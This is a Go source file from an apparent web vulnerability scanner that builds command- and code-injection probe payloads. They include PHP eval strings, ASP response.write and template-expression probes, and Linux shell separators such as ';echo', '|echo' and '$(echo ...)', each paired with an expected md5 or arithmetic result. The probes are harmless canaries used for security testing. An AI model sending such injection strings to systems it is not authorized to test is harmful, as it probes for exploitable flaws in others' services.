/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package cmd_injection

import (
	"fmt"
	"wscan/core/http"
	"wscan/core/utils"
)

// randint = random.randint(5120, 10240)
//        verify_result = md5(str(randint).encode())
//        _payloads = [
//            "print(md5({}));".format(randint),
//            ";print(md5({}));".format(randint),
//            "';print(md5({}));$a='".format(randint),
//            "\";print(md5({}));$a=\"".format(randint),
//            "${{@print(md5({}))}}".format(randint),
//            "${{@print(md5({}))}}\\".format(randint),
//            "'.print(md5({})).'".format(randint)
//        ]

type CmdInjectionPayload struct {
	Payload       string
	VerifyResult  string
	ParameterType string
}

func RenderIntMd5Payload(strFmt string) (payload string, verifyResult string) {
	randint := utils.RandInt(5120, 10240)
	payload = fmt.Sprintf(strFmt, randint)
	verifyResult = utils.MD5(fmt.Sprintf("%d", randint))
	return
}

func RenderIntMul(strFmt string) (payload string, verifyResult string) {
	randint1 := utils.RandInt(5120, 10240)
	randint2 := utils.RandInt(5120, 10240)
	randint3 := randint1 * randint2
	payload = fmt.Sprintf(strFmt, randint1, randint2)
	verifyResult = fmt.Sprintf("%d", randint3)
	return
}

func RenderIntAdd(strFmt string) (payload string, verifyResult string) {
	randint1 := utils.RandInt(100000000, 500000000)
	randint2 := utils.RandInt(100000000, 500000000)
	randint3 := randint1 + randint2
	payload = fmt.Sprintf(strFmt, randint1, randint2)
	verifyResult = fmt.Sprintf("%d", randint3)
	return
}

// "response.write(%d*%d)+"
func GenCmdInjectionPayload() (ret []CmdInjectionPayload) {
	// 现有 payload 保持不变
	addPayloads := []string{"\nexpr %d + %d\n", "/*1*/{{%d+%d}}"}
	for _, addPayload := range addPayloads {
		cp := CmdInjectionPayload{ParameterType: http.ParameterTypeSuffix}
		cp.Payload, cp.VerifyResult = RenderIntAdd(addPayload)
		ret = append(ret, cp)
	}
	md5Payloads := []string{"${@var_dump(md5(%d))};", "'-var_dump(md5(%d))-'", "print(md5(%d));", ";print(md5(%d));", "';print(md5(%d));$a='"}
	for _, md5Payload := range md5Payloads {
		cp := CmdInjectionPayload{ParameterType: http.ParameterTypeValue}
		cp.Payload, cp.VerifyResult = RenderIntMd5Payload(md5Payload)
		ret = append(ret, cp)
	}
	mulPayloads := []string{"response.write(%d*%d)", "'+response.write(%d*%d)+'", `"response.write(%d*%d)+"`, "#{%d*%d}", "{{%d*%d}}", "{{= %d*%d}}", "<# %d*%d>", "${{\"{{\"}}%d*%d{{\"}}\"}}"}
	for _, mulPayload := range mulPayloads {
		cp := CmdInjectionPayload{ParameterType: http.ParameterTypeValue}
		cp.Payload, cp.VerifyResult = RenderIntMul(mulPayload)
		ret = append(ret, cp)
	}

	// D1-05: 新增 Linux shell 命令注入 payload（Suffix 类型）
	// 这些 payload 追加到参数值后，适用于参数值被拼接到命令中的场景（如 ping INPUT）
	shellSuffixPayloads := []string{
		";echo %s",
		"|echo %s",
		"||echo %s",
		"&&echo %s",
		"\necho %s\n",
		"`echo %s`",
		"$(echo %s)",
	}
	for _, fmtStr := range shellSuffixPayloads {
		cp := CmdInjectionPayload{ParameterType: http.ParameterTypeSuffix}
		randint := utils.RandInt(5120, 10240)
		md5Result := utils.MD5(fmt.Sprintf("%d", randint))
		cp.Payload = fmt.Sprintf(fmtStr, md5Result)
		cp.VerifyResult = md5Result
		ret = append(ret, cp)
	}

	// D1-05: 新增 Linux shell 命令注入 payload（Value 替换类型）
	// 这些 payload 替换整个参数值，适用于参数值直接作为命令的场景
	shellValuePayloads := []string{
		"echo %s",
		"`echo %s`",
		"$(echo %s)",
	}
	for _, fmtStr := range shellValuePayloads {
		cp := CmdInjectionPayload{ParameterType: http.ParameterTypeValue}
		randint := utils.RandInt(5120, 10240)
		md5Result := utils.MD5(fmt.Sprintf("%d", randint))
		cp.Payload = fmt.Sprintf(fmtStr, md5Result)
		cp.VerifyResult = md5Result
		ret = append(ret, cp)
	}

	return ret
}
